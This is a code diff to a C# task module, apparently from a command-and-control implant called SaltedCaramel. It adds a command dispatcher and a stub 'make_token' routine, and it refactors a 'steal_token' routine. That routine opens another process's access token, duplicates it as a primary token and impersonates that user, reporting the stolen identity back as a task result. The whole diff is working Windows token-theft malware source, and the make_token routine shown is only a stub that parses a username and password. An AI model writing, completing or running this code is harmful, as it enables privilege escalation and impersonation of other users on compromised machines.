@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32.SafeHandles;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -11,6 +10,24 @@ namespace SaltedCaramel.Tasks
         public static IntPtr stolenHandle;
 
         public static void Execute(SCTaskObject task)
+        {
+            if (task.command == "steal_token")
+            {
+                StealToken(task);
+            }
+            else if (task.command == "make_token")
+            {
+                MakeToken(task);
+            }
+        }
+
+        public static void MakeToken(SCTaskObject task)
+        {
+            string user = task.@params.Split(' ')[0];
+            string pass = task.@params.Split(' ')[1];
+        }
+
+        public static void StealToken(SCTaskObject task)
         {
             try
             {
@@ -35,7 +52,7 @@ namespace SaltedCaramel.Tasks
                     stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token
 
                     // Get handle to target process token
-                    bool procToken = Win32.OpenProcessToken(
+                    bool procToken = Win32.Advapi32.OpenProcessToken(
                         procHandle,                                 // ProcessHandle
                         (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
                         out IntPtr tokenHandle);                           // TokenHandle
@@ -48,12 +65,12 @@ namespace SaltedCaramel.Tasks
                     try
                     {
                         // Duplicate token as stolenHandle
-                        bool duplicateToken = Win32.DuplicateTokenEx(
+                        bool duplicateToken = Win32.Advapi32.DuplicateTokenEx(
                             tokenHandle,                                    // hExistingToken
                             (uint)TokenAccessLevels.MaximumAllowed,         // dwDesiredAccess
                             IntPtr.Zero,                                    // lpTokenAttributes
                             (uint)TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
-                            Win32.TOKEN_TYPE.TokenImpersonation,            // TokenType
+                            Win32.Advapi32.TOKEN_TYPE.TokenPrimary,         // TokenType
                             out stolenHandle);                              // phNewToken
 
                         if (!duplicateToken) // Check if DuplicateTokenEx was successful
@@ -63,8 +80,8 @@ namespace SaltedCaramel.Tasks
 
                         WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                         Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
-                        Win32.CloseHandle(tokenHandle);
-                        Win32.CloseHandle(procHandle);
+                        Win32.Kernel32.CloseHandle(tokenHandle);
+                        Win32.Kernel32.CloseHandle(procHandle);
 
                         task.status = "complete";
                         task.message = "Successfully impersonated " + ident.Name;
@@ -90,12 +107,10 @@ namespace SaltedCaramel.Tasks
                 task.status = "error";
                 task.message = e.Message;
             }
-
         }
-
         public static void Revert(SCTaskObject task)
         {
-            Win32.CloseHandle(stolenHandle);
+            Win32.Kernel32.CloseHandle(stolenHandle);
             stolenHandle = IntPtr.Zero;
             task.status = "complete";
         }
